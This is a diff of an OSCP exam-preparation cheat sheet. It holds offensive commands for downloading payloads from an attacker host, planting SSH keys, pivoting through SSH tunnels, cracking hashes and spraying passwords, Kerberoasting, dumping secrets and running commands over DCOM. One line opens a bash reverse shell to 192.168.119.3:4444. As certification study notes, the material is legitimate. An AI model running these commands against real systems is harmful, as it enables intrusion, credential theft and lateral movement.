@@ -4,9 +4,7 @@ Notes from preparation for OSCP exam.
 
 # GitHub recon
 
-- You need to find traces of the `.git` files on the target machine.
-- Now navigate to the directory where the file is located, a potential repository.
-- Commands
+- You need to find the `.git` files on the target machine.
 
 ```bash
 # Log information of the current repository.
@@ -19,16 +17,16 @@ git show <commit-id>
 ```
 
 - If you identify `.git` active on the website. Use https://github.com/arthaud/git-dumper now it downloads all the files and saves it locally. Perform the same above commands and escalate.
-- Some useful GitHub dorks: [https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets) → this might not be relevant to the exam environment.
+- [https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets)
 
 # Connecting to RDP
 
 ```bash
-xfreerdp /u:uname /p:'pass' /v:IP
-xfreerdp /d:domain.com /u:uname /p:'pass' /v:IP
+xfreerdp /u:user /p:'password' /v:IP
+xfreerdp /d:domain /u:user /p:'password' /v:IP
 
 # try this option if normal login doesn't work
-xfreerdp /u:uname /p:'pass' /v:IP +clipboard 
+xfreerdp /u:user /p:'password' /v:IP +clipboard 
 ```
 
 # Adding SSH Public key
@@ -36,19 +34,17 @@ xfreerdp /u:uname /p:'pass' /v:IP +clipboard
 - This can be used to get ssh session, on target machine which is based on linux
 
 ```bash
-# give any password
-ssh-keygen -t rsa -b 4096 
+# defaults are typically fine, but you can fine-tune line 38 to your liking
+# I generally don't like adding a passphrase, but you can if you insist.
+ssh-keygen
 
 # This created both id_rsa and id_rsa.pub in ~/.ssh directory
-# Copy the content in "id_rsa.pub" and create ".ssh" directory in /home of target machine.
-chmod 700 ~/.ssh
+# Copy the content in "id_rsa.pub" to "authorized_keys" in the ".ssh" directory in /home of target machine.
+cat id_rsa.pub >> authorized_keys
 
-# enter the copied content here
-nano ~/.ssh/authorized_keys 
-chmod 600 ~/.ssh/authorized_keys 
-
-# On Attacker machine
-ssh username@target_ip # enter password if you gave any
+# On Attacker machine, give copied private key 600 permissions. You should be able to log in now.
+chmod 600 id_rsa
+ssh username@target_ip -i id_rsa 
 ```
 
 # File Transfers
@@ -56,34 +52,36 @@ ssh username@target_ip # enter password if you gave any
 ## Windows to Kali
 
 ```bash
-kali> impacket-smbserver -smb2support <sharename> .
-win> copy file \\KaliIP\sharename
+# kali
+impacket-smbserver -smb2support <sharename> .
+# windows
+copy file \\KaliIP\sharename
 ```
 
 ## Netcat
 
 ```bash
 # Attacker
-nc <target_ip> 1234 < nmap
+nc target_ip 1234 < nc64.exe
 
 # Target
-nc -lvp 1234 > nmap
+nc -lvp 1234 > nc64.exe
 ```
 
 ## Downloading on Windows
 
-```bash
-bash -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
-iwr -uri http://lhost/file -Outfile file
-certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
+```powershell
+bash -command Invoke-WebRequest -Uri http://adversary:port/FILE -Outfile C:\\temp\\FILE
+iwr -uri http://adversary:port/file -Outfile file
+certutil -urlcache -split -f "http://adversary:port/FILE" FILE
 copy \\kali\share\file .
 ```
 
 ## Downloading on Linux
 
 ```bash
-wget http://lhost/file
-curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
+wget http://adversary:port/FILE
+curl http://adversary:port/FILE OUTPUT_FILE
 ```
 
 
@@ -101,79 +99,98 @@ net localgroup "Remote Desktop Users" adversary /add
 ## Linux
 
 ```bash
-adduser <uname> # Interactive
-useradd <uname>
-
-useradd -u <UID> -g <group> <uname>  # UID can be something new than existing, this command is to add a user to a specific group
+adduser user # Interactive
+useradd user
+# UID can be something new than existing, this command is to add a user to a specific group
+useradd -u UID -g group user  
 ```
 
 # Password-Hash Cracking
 
+## Determine hash type
+
 *Hash Analyzer*: [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/) 
+
+## Is hash well known? 
 
 *Crackstation*: [https://crackstation.net/](https://crackstation.net/)
 
-## fcrackzip
+## JtR (John the Ripper)
 
 ```bash
-fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip # Cracking zip files
-```
+# Main *2john(s)...
+ssh2john id_rsa > hash.ssh
+kee2john db.kdbx > hash.keepass
+zip2john file.zip > hash.zip 
 
-## John
+*Full List*: https://github.com/openwall/john/tree/bleeding-jumbo/run 
 
-> [https://github.com/openwall/john/tree/bleeding-jumbo/run](https://github.com/openwall/john/tree/bleeding-jumbo/run)
-> If there’s an encrypted file, try to convert it into john hash and crack.
-
-```bash
-ssh2john.py id_rsa > hash
 # Convert the obtained hash to John format(above link)
 john hashfile --wordlist=rockyou.txt
 ```
 
 ## Hashcat
 
-> [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
-> 
-
 ```bash
 # Obtain the Hash module number 
-hashcat -m <number> hash wordlists.txt --force
+hashcat -h | grep ntlm
+hashcat -m 1000 hash wordlists.txt --force
 ```
 
-# SSH Pivoting
+# SSH tunneling and stuff
 
 ```bash
 # TOR port
-ssh adminuser@target -i id_rsa -D 9050 
+ssh pwned@target -i id_rsa -D 9050 
 
 # Change the info in /etc/proxychains4.conf also enable "Quiet Mode"
 # Example
 proxychains4 crackmapexec smb TARGET 
+
+# Instruct SSH to listen on all interfaces on port 4455 from the compromised host (0.0.0.0:4455),
+# then forward all packets to port 445 on the newly-found host (INTERNAL:445).
+ssh -N -L 0.0.0.0:4455:INTERNAL:445 user@COMPROMISED
+
+# An example of using the new tunnel
+# SMBClient traffic to COMPROMISED:4455 is forwarded to INTERNAL:445, so...
+smbclient -p 4455 -L //192.168.1.3/ -U admin --password=Welcome123!
+
+# Dynamic port forwarding
+# In OpenSSH, a dynamic port forward is created with the -D option. 
+# The -D option takes the IP address and port to bind to. 
+# In this case, we want it to listen on all interfaces on port 9999. 
+# We don't need to specify a socket address to forward to. 
+# The -N flag is used to prevent a shell from being spawned.
+# On COMPROMISED...
+ssh -N -D 0.0.0.0:9999 user@COMPROMISED
+
+# Remote port forwarding
+# Run on COMPROMISED to create an SSH remote port forward as part of an SSH connection back to Kali
+# The remote port forward option is -R, with the listening socket defined first and the forwarding socket next.
+# Example 1: listen on port 2345 on our Kali machine (127.0.0.1) and forward all traffic to the target machine.
+ssh -N -R 127.0.0.1:2345:TARGET:5432 adversary@KALI
+
+# Example 2: open remote port forward through a perimeter machine to open traffic from Kali to INTERNAL
+sudo ssh -N -R INTERNAL:7781:EXTERNAL:18890 adversary@KALI 
+
+# Remote dynamic port forwarding, run from COMPROMISED
+ssh -N -R 9998 adversary@KALI
+# Add line to proxychains
+sudo echo "socks5 127.0.0.1 9998" >> /etc/proxychains4.conf
+# Example of usage:
+proxychains nmap -vvv -sT --top-ports=20 -Pn -n INTERNAL
 ```
 
 # Dealing with Passwords
 
-## When there’s a scope for bruteforce or hash-cracking then try the following:
+## When you suspect brute forcing or have cracked some hashes:
 
     - Have a valid usernames first
     - Dont firget trying `admin:admin`
-    - Try `username:username` as first credential
+    - Try `username:username` as first credential, 'service:service' (like jenkins:jenkins)
     - If it’s related to a service, try default passwords.
     - Service name as the username as well as the same name for password.
-    - Use Rockyou.txt
-
-## Some default passwords to always try out!
-
-```bash
-password
-password1
-Password1
-Password@123
-password@123
-admin
-administrator
-admin@123
-```
+    - Use rockyou.txt
 
 # Impacket
 
@@ -363,18 +380,18 @@ hydra -v -C /usr/share/seclists/SecLists-master/Passwords/Default-Credentials/ft
 
 ```bash
 # Login
-ssh uname@IP # enter password in the prompt
+ssh user@IP # enter password in the prompt
 
 # id_rsa or id_ecdsa file
 chmod 600 id_rsa/id_ecdsa
-ssh uname@IP -i id_rsa/id_ecdsa # if it still asks for password, crack them using John
+ssh user@IP -i id_rsa/id_ecdsa # if it still asks for password, crack them using John
 
 # cracking id_rsa or id_ecdsa
 ssh2john id_ecdsa(or)id_rsa > hash
 john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
 
 # bruteforce
-hydra -l uname -P passwords.txt IP ssh # '-L' for usernames list, '-l' for username and viceversa
+hydra -l user -P passwords.txt IP ssh # '-L' for usernames list, '-l' for username and viceversa
 
 # check for vulnerabilities associated with the version identified.
 ```
@@ -711,7 +728,7 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 
 
 # PHP wrapper
-curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>" 
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('user%20-a');?>" 
 curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php 
 ```
 
@@ -1369,7 +1386,7 @@ Import-Module .\Sharphound.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" 
 
 # Bloodhound-Python
-bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all # output will be saved in you kali machine
+bloodhound-python -u 'user' -p 'password' -ns <rhost> -d <domain-name> -c all # output will be saved in you kali machine
 ```
 
 - Running Bloodhound
@@ -1450,7 +1467,7 @@ gpp-decrypt "cpassword"
 ```bash
 # Crackmapexec - check if the output shows 'Pwned!'
 # use continue-on-success option if it's a subnet
-crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success 
+crackmapexec smb <IP or subnet> -u users.txt -p 'password' -d <domain> --continue-on-success 
 
 # Kerbrute
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
@@ -1463,11 +1480,14 @@ See https://github.com/Br14n41/asrep-roaster
 ## Kerberoasting
 
 ```bash
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast # dumping from compromised windows host, and saving with customname
+# dumping from compromised windows host, and saving with customname
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast 
 
-impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request # from kali machine
+# from kali machine
+impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request 
 
-hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
+# cracking hashes
+hashcat -m 13100 hashes.txt wordlist.txt --force 
 ```
 
 ## Silver Tickets
@@ -1508,9 +1528,9 @@ ps> iwr -UseDefaultCredentials <servicename>://<computername>
 ```bash
 impacket-secretsdump <domain>/<user>:<password>@IP
 # local user
-impacket-secretsdump uname@IP -hashes lmhash:ntlmhash 
+impacket-secretsdump user@IP -hashes lmhash:ntlmhash 
 # domain user
-impacket-secretsdump domain/uname@IP -hashes lmhash:ntlmhash 
+impacket-secretsdump domain/user@IP -hashes lmhash:ntlmhash 
 ```
 
 ## Dumping NTDS.dit
@@ -1558,8 +1578,6 @@ winrs -r:<computername> -u:<user> -p:<password> "command"
 ```
 
 ## crackmapexec
-
-- If stuck make use of [Wiki](https://www.crackmapexec.wiki/)
 
 ```bash
 # supported services
@@ -1639,7 +1657,7 @@ dir \\<RHOST>\admin$
 ## DCOM
 
 ```powershell
-$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.150.8"))
 
 $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
 
